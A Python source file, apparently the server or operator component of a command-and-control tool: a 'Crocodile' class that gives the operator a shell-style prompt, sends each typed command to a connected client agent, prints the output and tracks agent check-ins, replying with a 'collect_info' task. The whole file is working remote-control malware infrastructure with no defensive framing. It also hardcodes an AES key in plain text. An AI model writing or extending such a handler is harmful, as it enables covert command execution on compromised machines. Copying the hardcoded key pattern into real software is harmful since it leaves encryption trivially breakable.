import sys
import os
import asyncio
project_root = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))
sys.path.insert(0, project_root)
from crypto.aes_encryptor import AESEncryptor

class Crocodile:
    def __init__(self):
        key = b"thisis16byteskey"
        self.encryptor = AESEncryptor(key)
        self.sessions = {}

    async def start(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
        if not isinstance(reader, asyncio.StreamReader):
            raise TypeError("reader debe ser una instancia de asyncio.StreamReader")
        current_dir = await reader.read(1024)
        count = 0
        while True:
            try: 
                if isinstance(current_dir, bytes):
                    command = await self.get_input(current_dir.decode() + '#:')
                elif isinstance(current_dir, str):
                    command = await self.get_input(current_dir + '#:')
                else:
                    raise TypeError("current_dir debe ser de tipo bytes o str")
                if command.lower() == "exit":
                    break
                elif command.startswith("cd"):
                    # writer.write(command.encode('utf-8'))
                    # res = await reader.read(36)           
                    # current_dir = res
                    r = command.encode('utf-8')
                    writer.write(r)
                    resp = await reader.read(1024)
                    current_dir = resp.decode()
                    print(current_dir)
                else:
                    res= command.encode('utf-8')
                    writer.write(res)
                    resp = await reader.read(1024)
                    current_dir = resp
                    print(current_dir)
                if not resp:
                    print("🔴 El cliente cerró la conexión.")
                    break
                    
                print("Respuesta recibida:", resp.decode())
            except Exception as e:
                print("ocurrio un error", e)
                if( str(e).find("El nombre de red especificado ya no está disponible")):
                    break
        
    async def get_input(self,prompt: str):
        return await asyncio.to_thread(input, prompt)

    async def process_check_in(self, data: str) -> tuple:
        """Procesa el check-in de un agente."""
        agent_id, metadata = data.split("|")
        self.sessions[agent_id] = metadata
        return agent_id, "collect_info"
